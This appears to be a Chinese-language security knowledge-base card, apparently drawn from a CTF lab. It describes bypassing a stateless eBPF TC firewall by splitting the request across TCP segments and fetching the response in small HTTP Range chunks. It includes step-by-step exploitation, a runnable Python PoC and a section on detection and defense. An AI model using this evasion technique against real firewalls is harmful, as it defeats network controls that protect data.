---
id: web-generic-http-smuggling-ebpf-tc-stateless-keyword-bypass
title: eBPF TC 无状态防火墙绕过：TCP 分段与 HTTP Range 双向规避
type: scenario
domain: web
path: web/generic/http-smuggling
technique: stateless-tc-firewall-segmentation-range-bypass
aliases:
- eBPF TC 防火墙绕过
- 无状态检测绕过
- TCP 分段绕过关键字
- HTTP Range 绕过 egress
- clsact eBPF 绕过
tags:
- ebpf
- tc
- firewall
- waf-bypass
- tcp-segmentation
- http-range
- stateless
- evasion
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:24:40+08:00'
  notes: 已对照原文与截图核对：clsact ingress/egress 同一 tc/ingress section、bpf_loop+bpf_skb_load_bytes 关键字扫描、TCP_NODELAY+sleep 分段、Range 10 字节分块拼接 flag 均与原文及 img/07 输出一致；未验证点：原文 exp 中每轮 fetch_range 被调用两次属笔误无碍，IP 分片变体未实测
---

## 一句话结论

挂在 TC ingress/egress 的 eBPF 防火墙只对单个 skb 做关键字匹配、不维护 TCP 连接状态也不重组字节流；把 `flag` 拆到相邻 TCP 段即可绕过入站检测，再用 HTTP `Range` 让服务端把响应体分块返回即可绕过出站检测，最后在客户端拼接出完整内容。

## 原理

- TC `clsact` 的 ingress 钩子在 `netif_receive_skb` 阶段执行，早于 `tcp_v4_rcv` 与 TCP 重组；eBPF 程序通过 `bpf_skb_load_bytes(skb, off, buf, 4)` 读取当前包载荷并用 `bpf_loop()` 逐字节滑动匹配 `"flag"`、`'%'`，命中返回 `TC_ACT_SHOT` 丢包。
- 该程序没有连接状态（没有四元组 Map、没有序列号跟踪、没有重组缓冲），每个 TCP 段独立判断。`"GET /flag.html"` 被拆成 `"GET /f"` 与 `"lag.html"` 后，任何单段都不含连续 `"flag"`，两段都放行；TCP 栈在防火墙之后按序列号重组，Nginx 收到完整请求。
- 仅调用两次 `send()` 不够：Nagle 算法可能把小包合并成一个携带 `"flag"` 的段。设置 `TCP_NODELAY` 禁用 Nagle，并在每段之间 `sleep(0.1)`，可确保分段独立到达、各自通过检测。
- 出站方向：响应体包含 `flag` 会被 egress 钩子拦截。使用 HTTP `Range: bytes=N-M` 请求，Nginx 返回 `206 Partial Content` 与对应切片，单次响应不含完整 `flag`；按 10 字节分块请求并拼接，即可还原完整内容。
- 分块大小选择：`"flag"` 为 4 字节，若按 4 字节对齐可能恰好落在同一块内；10 字节分块让 `"fl"` 与 `"ag"` 落入相邻块，实际 HTML 中关键字周围有其他字符，更难对齐。
- 本质是“无状态包过滤 vs 面向连接的字节流”的语义鸿沟：防火墙在 L3/L4 单包层面看数据，应用在重组后的字节流层面看数据。

## 触发条件

- 防火墙为无状态实现：只按单包做关键字/正则匹配，不重组 TCP 流、不维护连接状态。
- 被保护资源的关键字出现在请求 URL/请求体或响应体中（如 `/flag.html`、响应含 `flag`）。
- 攻击者可控制 TCP 分段（`TCP_NODELAY` + 分段发送），且路径上没有会重新合并的中间设备。
- 服务端支持 HTTP Range（Nginx/Apache 默认支持静态文件 Range）。
- eBPF 程序未对 `%` 等编码绕过做额外处理；本文用 Range 避免编码需求。

## 利用步骤

1. 确认目标在 TC ingress/egress 挂钩子，且规则为关键字匹配（可用正常请求 `GET /flag.html` 观察被丢包/超时）。
2. 入站：建立 TCP 连接，设置 `TCP_NODELAY`，把请求行拆成 `"GET /f"` 与 `"lag.html HTTP/1.1\r\n"` 两段发送，中间 sleep 100ms；其余头正常发送。
3. 服务端返回 200/206；若响应被 egress 拦截，改用 Range。
4. 出站：对同一路径循环发送 `Range: bytes=i-(i+9)`，每次同样分段发送请求行，绕过 ingress。
5. 解析每个 206 响应的 body，按 offset 拼接，得到完整 `flag`。
6. 若某段被丢，重试该 offset；直到覆盖整个文件长度。

## PoC

```python
import socket, time

target_ip, target_port = "TARGET", 5000

def fetch_range(i):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # 禁用 Nagle
    s.connect((target_ip, target_port))

    parts = [
        b"GET /f",                                  # 拆开 "flag"
        b"lag.html HTTP/1.1\r\n",
        f"Host: {target_ip}\r\n".encode(),
        f"Range: bytes={i}-{i+9}\r\n".encode(),     # 只取 10 字节
        b"Connection: close\r\n\r\n",
    ]
    for p in parts:
        s.send(p)
        time.sleep(0.1)                             # 确保独立分段

    s.settimeout(3)
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()

    if b"\r\n\r\n" in data:
        return data.split(b"\r\n\r\n", 1)[1].decode(errors="ignore")
    return ""

full = ""
for i in range(0, 214, 10):        # 214 为 flag.html 长度，按实际调整
    full += fetch_range(i)
    print(f"[*] offset {i}: {fetch_range(i)!r}")

print("[+] reconstructed:", full)
```

原文在靶场成功拼接出完整 flag；若响应被 egress 丢弃，说明 Range 未生效或分块仍含关键字，需调整块大小/offset。

## 变体与关联

- 变体：IP 分片（IP_MF/IP_OFFSET）同样可让单包不含完整关键字，但需要目标重组 IP 分片；本文未使用。
- 变体：HTTP/1.1 chunked、gzip 压缩、大小写/编码变形可绕过简单关键字匹配，但可能被更严格的规则覆盖。
- 变体：若只有 ingress 无 egress，直接分段请求即可；若只有 egress，可用 Range/压缩/分块响应。
- 关联：与 HTTP 请求走私同属“协议解析差异/分层语义差异”类绕过；与 WAF 关键字绕过（编码/拼接/Unicode）互补。
- 关联卡片：[[web-python-waf-bypass-dynamic-attribute-keyword-split]]、[[web-python-waf-bypass-encoding-unicode-normalization]]

## 检测与防御

- 检测：同一连接出现极小的 TCP 段（几字节）且间隔约 100ms；多个段拼接后形成敏感 URL/关键字。
- 检测：短时间内大量 `Range: bytes=` 请求同一文件、每次仅取 10 字节，且响应被客户端拼接。
- 检测：`TCP_NODELAY` 导致的小包高频发送、PSH 标志异常；HTTP 206 响应比例异常。
- 修复：DPI/防火墙做 TCP 流重组后再匹配（Suricata/Zeek stream reassembly），或使用有状态 eBPF（Map 存四元组、序列号与重组缓冲）。
- 加固：对静态文件禁用/限制 Range，或对重组后的响应做检测；对分段小包做速率/行为告警；在应用层做敏感数据访问控制，而不是只靠网络关键字过滤。
- 注意：仅靠“包级关键字匹配”的防火墙无法防御分段/分块，必须提升到流级或应用级。
